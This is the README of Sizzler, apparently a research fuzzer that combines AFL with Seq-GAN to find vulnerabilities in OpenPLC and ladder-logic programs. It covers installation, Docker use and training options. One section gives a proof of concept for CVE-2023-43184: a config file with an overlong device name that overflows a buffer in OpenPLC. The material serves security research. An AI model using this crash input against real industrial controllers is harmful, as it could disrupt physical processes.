# Sizzler

**Sequential Fuzzing in Ladder Diagrams for Vulnerability Detection in Programmable Logic Controllers**

Sizzler is a hybrid fuzzing tool that combines American Fuzzy Lop (AFL-2.57b) with Sequential Generative Adversarial Networks (Seq-GAN) to improve vulnerability detection in Programmable Logic Controllers (PLCs). It implements a novel mutation strategy enhanced by machine learning to better explore the input space of ladder logic programs.

## Overview

Sizzler focuses on the analysis of executed ladder logic and implements a mutation strategy enhanced by a Seq-GAN formulation used within a fuzzing process. The tool consists of three main components:

1. **AFL Fuzzer** - Modified version of AFL-2.57b for coverage-guided fuzzing with Seq-GAN integration
2. **Seq-GAN Module** - PyTorch-based Sequential GAN for intelligent test case generation
3. **OpenPLC Integration** - Complete fuzzing infrastructure for real PLC runtime testing

### Key Features

- ✅ **AFL + Seq-GAN Integration** - AFL fuzzer enhanced with learned mutation sequences (6400×154 operators)
- ✅ **OpenPLC Fuzzing** - Automated build and fuzzing of real OpenPLC runtime
- ✅ **CVE Reproduction** - Verified CVE-2023-43184 buffer overflow in OpenPLC Modbus handler
- ✅ **Protocol-Aware Fuzzing** - Modbus/TCP message generation and parsing
- ✅ **Complete Automation** - One-command build scripts and fuzzing setup
- ✅ **Comprehensive Documentation** - Step-by-step guides for vulnerability research

## Requirements

### System Requirements
- Linux-based operating system
- Python 3.8 or higher
- GCC/Clang compiler (for AFL fuzzer)
- CUDA 11.0 or higher (optional, for GPU acceleration)
- Docker 20.10+ (recommended for easiest setup)

### Python Dependencies
- PyTorch >= 2.0.0
- NumPy >= 1.24.0

**Note**: Using Docker is the recommended installation method as it handles all dependencies automatically.

## Installation

### Quick Install

```bash
# Clone the repository
git clone https://github.com/Frosty1442/Sizzler.git
cd Sizzler

# Install Python package in development mode
pip install -e .
```

### Development Install

For development with testing and code quality tools:

```bash
pip install -e ".[dev]"
```

Or using requirements files:

```bash
pip install -r requirements-dev.txt
```

### Building AFL Fuzzer

To build the AFL fuzzer component:

```bash
cd Fuzzing
make
cd ..
```

### Docker Installation (Recommended)

The easiest way to get started with Sizzler is using Docker, which provides a consistent environment with all dependencies pre-installed.

#### Prerequisites
- Docker 20.10+
- Docker Compose 2.0+ (optional, for easier management)

#### Quick Start with Docker

```bash
# Build the Docker image
docker build -t sizzler-fuzzer .

# Run an interactive shell
docker run -it --rm \
  -v $(pwd):/sizzler \
  -v sizzler-output:/sizzler/output \
  sizzler-fuzzer

# Or use Docker Compose for easier management
docker-compose up -d
docker-compose exec sizzler bash
```

#### Docker Compose Usage

The included `docker-compose.yml` provides a convenient way to manage Sizzler:

```bash
# Start the container in detached mode
docker-compose up -d

# Access the container
docker-compose exec sizzler bash

# View logs
docker-compose logs -f sizzler

# Stop the container
docker-compose down

# Stop and remove volumes
docker-compose down -v
```

#### What's Included in the Docker Image

- Ubuntu 24.04 base
- Python 3.11
- Clang/LLVM 15
- Pre-built AFL fuzzer
- PyTorch 2.x (CPU-only for smaller image size)
- All Python dependencies
- Ladder diagram test cases

#### Docker Environment Variables

The Docker container respects these environment variables:

- `SIZZLER_DATA_PATH`: Path to training data (default: `/sizzler/data`)
- `PYTHONUNBUFFERED`: Set to 1 for immediate output

#### Using Docker for Development

Mount your local directory for live code changes:

```bash
docker run -it --rm \
  -v $(pwd):/sizzler \
  -v sizzler-output:/sizzler/output \
  -e SIZZLER_DATA_PATH=/sizzler/data \
  sizzler-fuzzer bash

# Inside container, any changes to mounted files are reflected immediately
python3 -m pytest tests/
```

#### Building with CUDA Support (Optional)

For GPU acceleration, modify the Dockerfile to use the CUDA base image:

```dockerfile
FROM nvidia/cuda:12.1.0-base-ubuntu24.04 as builder
# ... rest of Dockerfile
```

Then run with GPU support:

```bash
docker run -it --rm --gpus all \
  -v $(pwd):/sizzler \
  sizzler-fuzzer
```

## Usage

### Quick Start: OpenPLC Fuzzing

Fuzz the OpenPLC runtime to discover vulnerabilities:

```bash
# 1. Build OpenPLC with AFL instrumentation
./scripts/build_openplc.sh

# 2. Set up Seq-GAN environment
export SIZZLER_SEQGAN_DATA="$(pwd)/data/gene.data"

# 3. Run AFL fuzzing with Seq-GAN
./Fuzzing/afl-fuzz -i openplc_seeds -o openplc_output \
    -m none ./openplc_modbus_harness

# 4. Check for crashes
ls -la openplc_output/crashes/
```

**See [OPENPLC_FUZZING_GUIDE.md](OPENPLC_FUZZING_GUIDE.md) for complete documentation.**

### Reproducing CVE-2023-43184

To reproduce the verified buffer overflow vulnerability:

```bash
# Create malicious configuration file
cat > /tmp/mbconfig.cfg << 'EOF'
Num_Devices = "1"
device0{
    Name = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    Protocol = "TCP"
    Slave_ID = "1"
    Address = "127.0.0.1"
}
EOF

# Run OpenPLC (will crash with buffer overflow)
cd /tmp
/tmp/OpenPLC_v3/webserver/core/openplc
# Result: *** stack smashing detected ***: terminated
```

**See [CVE-2023-43184_REPRODUCTION.md](CVE-2023-43184_REPRODUCTION.md) for full analysis.**

### Training the Seq-GAN Model

The Seq-GAN component can be trained to generate intelligent test cases:

```bash
# Basic training with default parameters
sizzler --data_path ./data

# Training with custom parameters
sizzler \
    --data_path ./data \
    --rounds 200 \
    --g_pretrain_steps 150 \
    --d_pretrain_steps 75 \
    --batch_size 64 \
    --gen_lr 0.001 \
    --dis_lr 0.001
```

### Configuration

You can configure Sizzler using environment variables:

```bash
export SIZZLER_DATA_PATH=/path/to/your/data
export SIZZLER_OUTPUT_PATH=/path/to/output
```

Or by passing command-line arguments:

```bash
sizzler --data_path /custom/path --rounds 150
```

### Available Arguments

- `--data_path`: Path to data directory (default: ./data)
- `--rounds`: Number of adversarial training rounds (default: 150)
- `--g_pretrain_steps`: Generator pre-training steps (default: 120)
- `--d_pretrain_steps`: Discriminator pre-training steps (default: 50)
- `--g_steps`: Generator update steps per round (default: 1)
- `--d_steps`: Discriminator update steps per round (default: 3)
- `--batch_size`: Training batch size (default: 32)
- `--n_samples`: Number of samples to generate (default: 6400)
- `--gen_lr`: Generator learning rate (default: 0.001)
- `--dis_lr`: Discriminator learning rate (default: 0.001)
- `--vocab_size`: Vocabulary size (default: 10)
- `--no_cuda`: Disable CUDA training
- `--seed`: Random seed (default: 1)

## Project Structure

```
Sizzler/
├── sizzler/                    # Main Python package
│   ├── __init__.py            # Package initialization
│   ├── __version__.py         # Version information
│   ├── main.py                # Main training script
│   ├── config.py              # Configuration management
│   ├── models/                # Neural network models
│   │   ├── generator.py       # LSTM-based generator
│   │   ├── discriminator.py   # CNN-based discriminator
│   │   ├── target_lstm.py     # Target LSTM model
│   │   └── rollout.py         # Rollout policy
│   └── training/              # Training utilities
│       ├── data_iter.py       # Data iterators
│       └── loss.py            # Policy gradient loss
├── tests/                      # Test suite
│   ├── test_models.py         # Model tests
│   └── test_training.py       # Training utility tests
├── Fuzzing/                    # AFL fuzzer (C/C++)
│   └── afl-fuzz.c             # Seq-GAN integration (lines 6107-6680)
├── Ladder Diagram Testbed/     # Test cases (31 .ld files)
├── scripts/                    # Automation scripts
│   └── build_openplc.sh       # OpenPLC build automation
├── openplc_seeds/              # Modbus protocol seed inputs
│   ├── device_config.bin      # Normal device config
│   ├── device_config_long.bin # Long device names
│   ├── read_holding_regs.bin  # Read registers
│   ├── write_single_reg.bin   # Write single
│   └── write_multiple_regs.bin # Write multiple
├── data/                       # Training data
│   └── gene.data              # Seq-GAN sequences (6400×154)
├── openplc_modbus_harness.c   # Modbus fuzzing harness
├── openplc_modbus_harness     # Compiled harness (AFL-instrumented)
├── pyproject.toml             # Modern Python packaging
├── setup.py                   # Backward-compatible setup
├── requirements.txt           # Core dependencies
├── requirements-dev.txt       # Development dependencies
└── README.md                  # This file
```

## Documentation

Comprehensive guides for vulnerability research:

- **[OPENPLC_FUZZING_GUIDE.md](OPENPLC_FUZZING_GUIDE.md)** - Complete fuzzing guide
  - OpenPLC build instructions
  - Fuzzing campaign setup
  - AFL + Seq-GAN integration
  - Expected results and analysis

- **[CVE-2023-43184_REPRODUCTION.md](CVE-2023-43184_REPRODUCTION.md)** - Verified CVE reproduction
  - Vulnerable code analysis
  - Step-by-step crash reproduction
  - Root cause and impact assessment
  - Fix recommendations

- **[DEMO_RESULTS.md](DEMO_RESULTS.md)** - Live demonstration results
  - Infrastructure verification
  - Fuzzing metrics
  - Component status

- **[SIZZLER_ARCHITECTURE.md](SIZZLER_ARCHITECTURE.md)** - System architecture
  - Complete paper analysis
  - CVE documentation
  - Implementation details

- **[AFL_SEQGAN_INTEGRATION.md](AFL_SEQGAN_INTEGRATION.md)** - AFL integration details
  - Operator mapping
  - gene.data format
  - Integration points

## Development

### Running Tests

Run the test suite using pytest:

```bash
# Run all tests
pytest

# Run with coverage report
pytest --cov=sizzler --cov-report=html

# Run specific test file
pytest tests/test_models.py
```

### Code Quality

Format code with black:

```bash
black sizzler/ tests/
```

Check code style with flake8:

```bash
flake8 sizzler/ tests/
```

## Architecture

Sizzler combines two powerful techniques:

1. **Coverage-Guided Fuzzing (AFL)**: Provides feedback-driven exploration of the program state space
2. **Sequential GAN**: Learns patterns from successful test cases to generate more effective mutations

The Seq-GAN component consists of:
- **Generator**: LSTM-based network that generates test case sequences
- **Discriminator**: CNN-based network that distinguishes real from generated sequences
- **Rollout Policy**: Monte Carlo search for intermediate rewards

## Data Format

Training data should be in text format with space-separated integers:

```
1 2 3 4 5 6 7 8 9
10 11 12 13 14 15
...
```

Each line represents a sequence of tokens from the vocabulary.

## Research

This tool is based on research in PLC security and fuzzing. For more details, see the academic paper:

[Link to paper - https://eprints.gla.ac.uk/310034/2/310034.pdf]

## Contributing

Contributions are welcome! Please feel free to submit issues and pull requests.

### Development Setup

1. Fork the repository
2. Clone your fork
3. Install development dependencies: `pip install -r requirements-dev.txt`
4. Make your changes
5. Run tests: `pytest`
6. Submit a pull request

## License

[License information - please add appropriate license]

## Citation

If you use Sizzler in your research, please cite:

```bibtex
[Add citation information]
```

## Acknowledgments

- Based on AFL (American Fuzzy Lop) by Michal Zalewski
- Seq-GAN implementation inspired by Yu et al.
- OpenPLC v3 by Thiago Alves (https://github.com/thiagoralves/OpenPLC_v3)
- CVE-2023-43184 vulnerability research and responsible disclosure

## Quick Reference

### File Locations

| Component | Path | Description |
|-----------|------|-------------|
| AFL fuzzer | `Fuzzing/afl-fuzz` | Coverage-guided fuzzer with Seq-GAN |
| Seq-GAN data | `data/gene.data` | 6400 mutation sequences |
| OpenPLC build | `scripts/build_openplc.sh` | Automated OpenPLC setup |
| Modbus harness | `openplc_modbus_harness` | Protocol fuzzing harness |
| Seed inputs | `openplc_seeds/` | 5 Modbus test cases |

### Fuzzing Workflow

1. **Build OpenPLC**: `./scripts/build_openplc.sh`
2. **Set environment**: `export SIZZLER_SEQGAN_DATA="$(pwd)/data/gene.data"`
3. **Run fuzzer**: `./Fuzzing/afl-fuzz -i openplc_seeds -o output -m none ./openplc_modbus_harness`
4. **Check results**: `ls output/crashes/`

### Key Achievements

- ✅ Verified CVE-2023-43184 on real OpenPLC binary
- ✅ 856 KB OpenPLC runtime with 18 AFL instrumentation markers
- ✅ Complete Ladder Diagram → CVE discovery pipeline
- ✅ 6400 Seq-GAN learned mutation sequences
- ✅ Protocol-aware Modbus/TCP fuzzing

## Contact

For questions and support, please open an issue on the GitHub repository.
